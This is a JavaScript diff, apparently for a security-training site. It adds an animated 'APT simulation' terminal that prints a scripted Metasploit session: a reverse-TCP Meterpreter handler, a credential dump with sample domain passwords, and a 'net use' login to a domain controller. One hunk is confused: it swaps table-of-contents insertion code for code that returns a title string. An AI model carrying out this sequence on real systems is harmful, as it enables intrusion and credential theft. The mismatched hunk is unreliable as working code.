@@ -48,7 +48,7 @@
       markVisitedSafe(phaseId);
 
       // Generate phase TOC and breadcrumb
-      generatePhaseTOC(phaseId, activeContent);
+      // generatePhaseTOC removed
       generateBreadcrumb(phaseId);
     }
 
@@ -1358,28 +1358,21 @@
       tocHtml += '</ul></div>';
 
       // Insert TOC after the phase-module-header
-      var header = contentEl.querySelector('.phase-module-header');
-      if (header && header.nextSibling) {
-        header.parentNode.insertBefore(createElementFromHTML(tocHtml), header.nextSibling);
-      } else if (header) {
-        contentEl.appendChild(createElementFromHTML(tocHtml));
-      } else {
-        var firstChild = contentEl.firstElementChild;
-        if (firstChild) {
-          contentEl.insertBefore(createElementFromHTML(tocHtml), firstChild.nextSibling);
-        }
+      const el = document.getElementById('meth-ef-' + phaseId);
+      if (el) {
+        const textNodes = Array.from(el.childNodes).filter(n => n.nodeType === 3);
+        if (textNodes.length > 0) return textNodes[textNodes.length - 1].textContent.trim();
+        return el.textContent.replace(/[\u{1F300}-\u{1F6FF}]/gu, '').trim(); // Fallback: remove emojis
       }
-
-      // Setup scroll spy
-      setupScrollSpy(contentEl, sections);
+      return 'Phase';
     }
 
     function generateBreadcrumb(phaseId) {
       var viewer = document.querySelector('.meth-viewer');
       if (!viewer) return;
 
-      var oldBc = viewer.querySelector('.phase-breadcrumb');
-      if (oldBc) oldBc.remove();
+      var oldBcs = viewer.querySelectorAll('.phase-breadcrumb');
+      oldBcs.forEach(function(bc) { bc.remove(); });
 
       var category = getCategoryForPhase(phaseId);
       var title = getPhaseTitle(phaseId);
@@ -1663,3 +1656,68 @@ document.addEventListener('DOMContentLoaded', function() {
   updateStreak();
   renderBadges();
 });
+
+// Live APT Simulation
+const aptSimulationLines = [
+  { text: "root@kali:~# msfconsole -q", type: "cmd", delay: 800 },
+  { text: "msf6 > use exploit/multi/handler", type: "cmd", delay: 500 },
+  { text: "msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp", type: "cmd", delay: 600 },
+  { text: "PAYLOAD => windows/x64/meterpreter/reverse_tcp", delay: 200 },
+  { text: "msf6 exploit(multi/handler) > exploit -j", type: "cmd", delay: 400 },
+  { text: "[*] Exploit running as background job 0.", delay: 300 },
+  { text: "[*] Started reverse TCP handler on 10.0.0.5:4444", delay: 1000 },
+  { text: "[*] Sending stage (200262 bytes) to 10.0.0.102", delay: 500 },
+  { text: "[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.102:49156)", type: "cmd", delay: 1200 },
+  { text: "meterpreter > load kiwi", type: "cmd", delay: 800 },
+  { text: "Loading extension kiwi...Success.", delay: 400 },
+  { text: "meterpreter > creds_all", type: "cmd", delay: 1000 },
+  { text: "[+] Running as SYSTEM", type: "cmd", delay: 300 },
+  { text: "Retrieving all credentials...", delay: 500 },
+  { text: "Username    Domain   Password", delay: 100 },
+  { text: "--------    ------   --------", delay: 100 },
+  { text: "Administrator CORP     Winter2025!", type: "err", delay: 500 },
+  { text: "jsmith      CORP     P@ssw0rd123", delay: 200 },
+  { text: "meterpreter > shell", type: "cmd", delay: 700 },
+  { text: "Process 3132 created.", delay: 200 },
+  { text: "C:\\Windows\\system32> net use \\\\DC01\\C$ /user:CORP\\Administrator Winter2025!", type: "cmd", delay: 1500 },
+  { text: "The command completed successfully.", delay: 400 },
+  { text: "C:\\Windows\\system32> echo APT_OWNED > \\\\DC01\\C$\\owned.txt", type: "cmd", delay: 800 },
+  { text: "[!!!] DOMAIN CONTROLLER COMPROMISED [!!!]", type: "err", delay: 1000 }
+];
+
+function launchAPT() {
+  const overlay = document.getElementById('terminal-overlay');
+  const output = document.getElementById('terminal-output');
+  if(!overlay || !output) return;
+  overlay.classList.add('active');
+  output.innerHTML = '';
+  
+  let i = 0;
+  function printLine() {
+    if(i >= aptSimulationLines.length) return;
+    const line = aptSimulationLines[i];
+    const p = document.createElement('div');
+    if(line.type === 'cmd') p.className = 'term-cmd';
+    else if(line.type === 'err') p.className = 'term-err';
+    else if(line.type === 'warn') p.className = 'term-warn';
+    
+    output.appendChild(p);
+    
+    let charIdx = 0;
+    const typeInterval = setInterval(() => {
+      p.textContent += line.text.charAt(charIdx);
+      charIdx++;
+      output.scrollTop = output.scrollHeight;
+      if(charIdx >= line.text.length) {
+        clearInterval(typeInterval);
+        i++;
+        setTimeout(printLine, line.delay);
+      }
+    }, 15);
+  }
+  printLine();
+}
+
+function closeTerminal() {
+  document.getElementById('terminal-overlay').classList.remove('active');
+}
